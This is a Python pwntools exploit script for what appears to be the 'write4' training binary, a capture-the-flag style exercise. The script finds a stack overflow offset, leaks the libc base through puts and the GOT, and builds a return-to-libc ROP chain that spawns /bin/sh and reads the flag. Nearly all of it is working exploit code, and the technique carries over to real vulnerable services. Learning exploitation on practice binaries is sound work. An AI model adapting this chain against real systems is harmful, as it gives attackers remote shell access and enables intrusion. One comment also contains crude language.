from pwn import *

# use the following command to have the binary listen on localhost:1234
# socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./write4

context.clear(arch="amd64")
LOCATION = "./write4"            # position of the binary 
LIBC_LOC = "/lib/x86_64-linux-gnu/libc.so.6" # position of libc
binary = ELF(LOCATION)          # create object with data from the binary
libc   = ELF(LIBC_LOC)          # create object with data from the libc
ropleak = ROP(binary)            # create object to help build ropchain to leak libc base address
ropexpl = ROP(binary)              # create object to help build ropchain to craft exploit
r = remote("localhost", 1234)   # establish connection with the binary

def overflow():                                         # function used to find return address offset
    log.info("Finding saved return address offset...")                   
    proc = process(LOCATION, timeout=2)                 # start local process 
    proc.sendline(cyclic(1024, n=8))                    # send cyclic pattern 
    proc.recvall()                                      # receive data from process
    core = Core("core")                                 # create object from data of the core dump
    offset = cyclic_find(core.pc, n=8)                  # calculate offset from cyclic pattern
    log.success("Saved return address at offset {0}".format(offset))
    return 'A' * offset                                 # return as much A's as needed

def findBaseAddr():         # function used to leak libc base address
    leak  = ""
    leak += offset          # overflow until saved return address
    leak += makeRopToLeak() # append ropchain to overwrite return address
    r.recvuntil(">")        
    r.sendline(leak)        # send leak string
    r.recv()
    libc.address = u64(str(r.recv(6) + "\x00\x00")) - libc.symbols["puts"]
    # black wizardry to pack return address is done here:
    # even though architecture is 64bit the real addresses with ASLR enabled use up to th 47th bit, hence
    # we get 6 bytes back by puts(). We append 2 null bytes at the end (little endianness, bitch) to form a
    # 8 byte address that gets passed to u64()
    log.success("Base address of libc is at {0}".format(hex(libc.address)))


def makeRopToLeak():                # function used to generate ropchain to leak libc base address
    ropleak.puts(binary.got["puts"]) # call puts with puts' GOT entry as argument
    ropleak.main()                   # call main in order to keep the binary from crashing
    return str(ropleak)              # return ropchain

def makeRopToHack():                                    # function used to craft ropchain for the exploit
    ropexpl.system(next(libc.search("/bin/sh\x00")))    # append system("/bin/sh") to ropchain
    return str(ropexpl)

def exploit():
    findBaseAddr()                      # find base address
    exp  = ""                           # create exploit string
    exp += offset                       # add A's to overflow until the return address
    exp += makeRopToHack()              # overwrite return address with ropchain beginning
    r.recvuntil('>')                    # receive data from the remote process until the prompt
    r.sendline(exp)                     # send exploit
    #r.interactive()                    # uncomment to get full shell
    r.sendline("cat flag.txt && exit") 
    log.success("Flag:" + r.recvall()) # profit

offset = overflow()
exploit() # start everything
